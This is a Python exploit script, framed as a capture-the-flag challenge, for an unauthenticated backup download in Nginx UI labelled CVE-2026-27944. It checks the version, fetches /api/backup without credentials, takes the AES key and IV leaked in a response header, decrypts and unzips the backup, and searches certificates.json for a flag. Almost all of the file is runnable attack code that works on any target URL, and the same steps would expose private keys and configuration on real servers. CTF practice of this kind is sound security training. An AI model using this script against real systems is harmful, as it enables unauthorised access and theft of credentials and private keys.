#!/usr/bin/env python3
"""
Exploit script for CTF challenge simulating CVE-2026-27944
Nginx UI — Unauthenticated Backup Download + Key Leak

Steps:
  1. Enumerate the target to discover Nginx UI version (< 2.3.3)
  2. Hit /api/backup WITHOUT authentication
  3. Extract the AES key + IV from the X-Backup-Security header
  4. Decrypt the AES-256-CBC encrypted backup
  5. Decompress the ZIP archive
  6. Parse certificates.json to find the flag in a "private key"
"""

import sys
import json
import base64
import zipfile
import io
import argparse

import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend


def banner():
    print(r"""
  ╔═══════════════════════════════════════════════════════╗
  ║   CVE-2026-27944 — Nginx UI Backup Exploit            ║
  ║   Unauthenticated Backup Download + Key Disclosure    ║
  ╚═══════════════════════════════════════════════════════╝
    """)


def step1_recon(base_url: str) -> str:
    print("[*] Step 1: Reconnaissance — checking /api/system/health")
    r = requests.get(f"{base_url}/api/system/health", timeout=10)
    data = r.json()
    version = data.get("version", "unknown")
    print(f"    [+] Nginx UI version detected: {version}")
    if version < "2.3.3":
        print("    [!] Version is VULNERABLE (< 2.3.3)")
    else:
        print("    [-] Version appears patched. Exploit may not work.")
    return version


def step2_download_backup(base_url: str) -> tuple[bytes, dict]:
    print("\n[*] Step 2: Downloading backup WITHOUT authentication")
    print(f"    GET {base_url}/api/backup")
    r = requests.get(f"{base_url}/api/backup", timeout=30)

    if r.status_code == 401:
        print("    [-] Got 401 — endpoint requires auth. Not vulnerable.")
        sys.exit(1)

    if r.status_code != 200:
        print(f"    [-] Unexpected status code: {r.status_code}")
        sys.exit(1)

    print(f"    [+] Received {len(r.content)} bytes (encrypted backup)")

    security_header = r.headers.get("X-Backup-Security")
    if not security_header:
        print("    [-] X-Backup-Security header not found!")
        sys.exit(1)

    print("    [+] Found X-Backup-Security header — decoding...")
    sec_data = json.loads(base64.b64decode(security_header))
    print(f"    [+] Algorithm: {sec_data.get('algorithm')}")
    print(f"    [+] Key: {sec_data.get('key')}")
    print(f"    [+] IV (b64): {sec_data.get('iv')}")
    print(f"    [+] Integrity SHA-256: {sec_data.get('integrity')}")

    return r.content, sec_data


def step3_decrypt(encrypted_data: bytes, sec_data: dict) -> bytes:
    print("\n[*] Step 3: Decrypting backup")
    key = bytes.fromhex(sec_data["key"])
    iv_from_header = base64.b64decode(sec_data["iv"])

    iv_from_blob = encrypted_data[:16]
    ciphertext = encrypted_data[16:]

    print(f"    [+] IV from data blob: {iv_from_blob.hex()}")
    print(f"    [+] IV from header:    {iv_from_header.hex()}")
    assert iv_from_blob == iv_from_header, "IV mismatch!"

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv_from_blob), backend=default_backend())
    dec = cipher.decryptor()
    padded = dec.update(ciphertext) + dec.finalize()

    unpadder = sym_padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded) + unpadder.finalize()

    print(f"    [+] Decrypted {len(plaintext)} bytes")
    return plaintext


def step4_extract(zip_data: bytes) -> dict:
    print("\n[*] Step 4: Extracting ZIP archive")
    buf = io.BytesIO(zip_data)
    contents = {}
    with zipfile.ZipFile(buf, "r") as zf:
        for name in zf.namelist():
            print(f"    [+] Found: {name}")
            contents[name] = zf.read(name).decode()
    return contents


def step5_find_flag(contents: dict):
    print("\n[*] Step 5: Searching for the flag in extracted data")

    if "certificates.json" in contents:
        certs = json.loads(contents["certificates.json"])
        for cert in certs:
            pk = cert.get("private_key", "")
            if "flag{" in pk:
                flag = pk.split("flag{")[1].split("}")[0]
                flag = f"flag{{{flag}}}"
                print(f"\n  ╔══════════════════════════════════════════════════╗")
                print(f"  ║  FLAG FOUND!                                     ║")
                print(f"  ║  {flag:<49}║")
                print(f"  ╚══════════════════════════════════════════════════╝\n")
                return flag

    for fname, data in contents.items():
        if "flag{" in data:
            idx = data.index("flag{")
            end = data.index("}", idx) + 1
            flag = data[idx:end]
            print(f"\n    [+] FLAG FOUND in {fname}: {flag}\n")
            return flag

    print("    [-] Flag not found in backup data")
    return None


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-27944 Exploit — Nginx UI Backup Leak")
    parser.add_argument("--target", "-t", default="http://localhost:9000", help="Target URL (default: http://localhost:9000)")
    args = parser.parse_args()

    banner()

    target = args.target.rstrip("/")
    print(f"[*] Target: {target}\n")

    step1_recon(target)
    encrypted_data, sec_data = step2_download_backup(target)
    zip_data = step3_decrypt(encrypted_data, sec_data)
    contents = step4_extract(zip_data)
    flag = step5_find_flag(contents)

    if flag:
        print("[+] Exploit completed successfully!")
    else:
        print("[-] Exploit finished but flag was not found.")
        print("    Try inspecting the extracted files manually:")
        for fname in contents:
            print(f"      - {fname}")


if __name__ == "__main__":
    main()
